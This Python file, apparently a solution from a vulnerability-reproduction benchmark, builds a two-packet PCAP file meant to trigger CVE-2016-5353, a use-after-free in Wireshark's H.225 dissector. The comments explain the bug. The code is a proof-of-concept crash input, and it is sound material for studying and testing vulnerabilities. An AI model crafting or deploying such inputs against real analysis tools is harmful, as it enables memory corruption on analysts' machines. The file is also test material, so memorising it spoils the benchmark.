import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # PCAP Global Header
        # Magic(4), Maj(2), Min(2), Zone(4), SigFigs(4), Snap(4), Net(4)
        # Network = 1 (Ethernet)
        # 0xa1b2c3d4 is the magic number for microsecond-resolution PCAP (Big Endian)
        # but we write it in Little Endian format (<) as d4c3b2a1 to match standard PCAP files on x86.
        pcap_header = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)

        # Common Ethernet/IP constants
        eth_proto_ipv4 = b'\x08\x00'
        src_ip = b'\x7f\x00\x00\x01' # 127.0.0.1
        dst_ip = b'\x7f\x00\x00\x01' # 127.0.0.1

        def checksum(data):
            if len(data) % 2 == 1:
                data += b'\x00'
            s = 0
            for i in range(0, len(data), 2):
                w = (data[i] << 8) + (data[i+1])
                s += w
            s = (s >> 16) + (s & 0xffff)
            s += (s >> 16)
            return ~s & 0xffff

        def create_packet(proto, dport, payload):
            # Ethernet Header (14 bytes)
            eth = b'\x00'*12 + eth_proto_ipv4

            # L4 Header construction
            if proto == 6: # TCP
                # Src(1234), Dst(dport), Seq(0), Ack(0), Off(5->20bytes), Flags(PSH|ACK), Win(65535), Sum(0), Urp(0)
                l4_len = 20
                l4 = struct.pack('!HHLLBBHHH', 1234, dport, 0, 0, 0x50, 0x18, 65535, 0, 0)
            elif proto == 17: # UDP
                # Src(1234), Dst(dport), Len, Sum(0)
                l4_len = 8
                l4 = struct.pack('!HHHH', 1234, dport, l4_len + len(payload), 0)
            else:
                return b''

            # IP Header (20 bytes)
            total_len = 20 + l4_len + len(payload)
            # Ver 4, IHL 5, TOS 0, TotalLen, ID, Flags, TTL 64, Proto, Cks, Src, Dst
            # Calculate checksum with 0 first
            ip_fields = struct.pack('!BBHHHBBH4s4s', 0x45, 0, total_len, 0, 0, 64, proto, 0, src_ip, dst_ip)
            chk = checksum(ip_fields)
            ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, total_len, 0, 0, 64, proto, chk, src_ip, dst_ip)

            frame = eth + ip + l4 + payload
            
            # PCAP Packet Header
            # Ts(4), Ts(4), CapLen(4), OrigLen(4)
            pkt_hdr = struct.pack('<IIII', 0, 0, len(frame), len(frame))
            
            return pkt_hdr + frame

        # CVE-2016-5353 Logic:
        # The vulnerability is a Heap Use-After-Free in the H.225 dissector.
        # The function `next_tvb_add_handle` writes to a list `next_tvb_list`.
        # This list is allocated in packet scope memory and should be reset per packet via `next_tvb_init`.
        
        # Packet 1: TCP Port 1720 (H.225 Call Signaling)
        # Purpose: Triggers `dissect_h225` which calls `next_tvb_init`.
        # This initializes `next_tvb_list` to point to a valid address in Packet 1's memory pool.
        # Once Packet 1 dissection is done, the memory is freed, but the global/static `next_tvb_list`
        # pointer still points to this freed memory (dangling pointer).
        pkt1 = create_packet(6, 1720, b'\x03\x00\x00\x04') # Minimal TPKT

        # Packet 2: UDP Port 1719 (H.225 RAS)
        # Purpose: Triggers `dissect_h225_h225_RasMessage`.
        # Vulnerability: This entry point DOES NOT call `next_tvb_init`.
        # We craft a payload that invokes `next_tvb_add_handle`.
        # `next_tvb_add_handle` tries to append to `next_tvb_list` (the dangling pointer).
        # This results in a write to freed memory (UAF).
        # Payload: Mimics PER encoded data containing OID 0.0.8.2250.0.5 which triggers next_tvb logic.
        payload_ras = b'\x00\x0c\x00\x08\x91\x4a\x00\x05' + b'\x00' * 16
        pkt2 = create_packet(17, 1719, payload_ras)

        return pcap_header + pkt1 + pkt2